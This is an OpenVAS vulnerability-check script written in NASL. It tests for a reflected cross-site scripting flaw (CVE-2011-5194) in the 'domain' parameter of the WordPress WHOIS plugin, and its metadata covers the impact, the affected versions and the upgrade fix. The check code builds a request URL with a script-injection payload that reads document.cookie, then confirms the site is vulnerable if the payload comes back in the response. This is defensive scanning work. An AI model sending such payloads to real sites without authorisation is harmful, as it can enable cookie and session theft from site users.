###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_whois_plugin_xss_vuln.nasl 13962 2019-03-01 14:14:42Z cfischer $
#
# WordPress WHOIS Plugin 'domain' Parameter Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802553");
  script_version("$Revision: 13962 $");
  script_bugtraq_id(51244);
  script_cve_id("CVE-2011-5194");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2017-04-25 14:51:04 +0200 (Di, 25 Apr 2017)$");
  script_tag(name:"creation_date", value:"2012-01-04 13:54:24 +0530 (Wed, 04 Jan 2012)");
  script_name("WordPress WHOIS Plugin 'domain' Parameter Cross-site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47428/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51244/info");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108271/wpwhois-xss.txt");
  script_xref(name:"URL", value:"http://plugins.trac.wordpress.org/changeset/482954/wordpress-whois-search");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to execute arbitrary web
  script or HTML in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress WHOIS Plugin version prior to 1.4.2.3");

  script_tag(name:"insight", value:"The flaw is caused by an input validation error in the 'domain' parameter
  in '/wp-content/plugins/wordpress-whois-search/wp-whois-ajax.php' when
  processing user-supplied data.");

  script_tag(name:"solution", value:"Upgrade to WordPress WHOIS Plugin version 1.4.2.3 or later.");

  script_tag(name:"summary", value:"This host is installed with WordPress WHOIS plugin and is prone to
  cross-site scripting vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://wordpress.org/extend/plugins/wordpress-whois-search/download/");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);

if(dir == "/") dir = "";
url = dir + '/wp-content/plugins/wordpress-whois-search/wp-whois-ajax.php?cmd=wpwhoisform&ms=Xss?domain="><script>alert(document.cookie);</script>';

if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(document\.cookie\);</script>", check_header:TRUE)){
  report = report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);